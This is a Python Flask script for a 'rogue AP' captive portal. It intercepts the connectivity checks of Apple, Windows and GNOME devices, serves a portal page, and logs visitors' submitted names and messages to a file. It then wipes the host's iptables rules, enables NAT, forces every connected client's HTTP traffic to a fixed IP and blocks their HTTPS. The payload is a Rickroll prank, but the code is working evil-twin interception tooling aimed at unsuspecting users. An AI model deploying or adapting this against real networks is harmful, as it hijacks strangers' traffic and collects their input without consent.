from flask import Flask, request, send_from_directory
import datetime
import subprocess
import socket
import os

app = Flask(__name__)

AP_INTERFACE = "wlan0"  # Interface running the rogue AP

# -------- Check if system has internet access ----------
def has_internet():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=2)
        return True
    except:
        return False

# -------- Detect internet uplink interface automatically ----------
def detect_uplink():
    routes = subprocess.getoutput("ip route")
    for line in routes.splitlines():
        if line.startswith("default"):
            return line.split()[-1]  # returns interface name (e.g., wlan1, eth0)
    return None

# -------- Set up NAT, IP forwarding, and Rickroll redirect ----------
def enable_rickroll(ap_iface, uplink_iface):
    print(f"[+] Enabling NAT: {ap_iface} -> {uplink_iface}")

    subprocess.run("sysctl -w net.ipv4.ip_forward=1", shell=True)

    # Clear existing iptables rules
    subprocess.run("iptables -F", shell=True)
    subprocess.run("iptables -t nat -F", shell=True)

    # Set up NAT (internet access)
    subprocess.run(f"iptables -t nat -A POSTROUTING -o {uplink_iface} -j MASQUERADE", shell=True)
    subprocess.run(f"iptables -A FORWARD -i {ap_iface} -o {uplink_iface} -m state --state RELATED,ESTABLISHED -j ACCEPT", shell=True)
    subprocess.run(f"iptables -A FORWARD -i {ap_iface} -o {uplink_iface} -j ACCEPT", shell=True)

    # Optionally redirect all HTTP to YouTube Rickroll
    subprocess.run(f"iptables -t nat -A PREROUTING -i {ap_iface} -p tcp --dport 80 -j DNAT --to-destination 216.58.212.78", shell=True)  # Google IP
    # Block HTTPS to avoid confusion
    subprocess.run(f"iptables -t nat -A PREROUTING -i {ap_iface} -p tcp --dport 443 -j REJECT", shell=True)

# --------- Routes ---------

# Catch all OS captive checks (Apple, Windows, GNOME)
@app.route("/generate_204")
@app.route("/hotspot-detect.html")
@app.route("/ncsi.txt")
@app.route("/success.txt")
@app.route("/check_network_status.txt")
@app.route("/connecttest.txt")
@app.route("/redirect")
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path=""):
    return send_from_directory(".", "portal.html")

@app.route("/submit", methods=["POST"])
def submit():
    name = request.form.get("name")
    message = request.form.get("message")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open("messages.txt", "a") as f:
        f.write(f"[{timestamp}] {name}: {message}\n")

    if has_internet():
        uplink = detect_uplink()
        if uplink:
            enable_rickroll(AP_INTERFACE, uplink)
            return """
            <html><body style='background:black; color:lime; font-family:monospace; text-align:center;'>
            <h2>✅ You're now connected.</h2>
            <p><a href='https://youtu.be/dQw4w9WgXcQ' target='_blank'>Click here to proceed</a></p>
            </body></html>
            """
        else:
            return "<h2 style='color:orange;background:black;font-family:monospace;text-align:center;'>⚠️ Internet uplink not found.</h2>"
    else:
        return "<h2 style='color:lime;background:black;font-family:monospace;text-align:center;'>📡 Message received. You may now disconnect.</h2>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
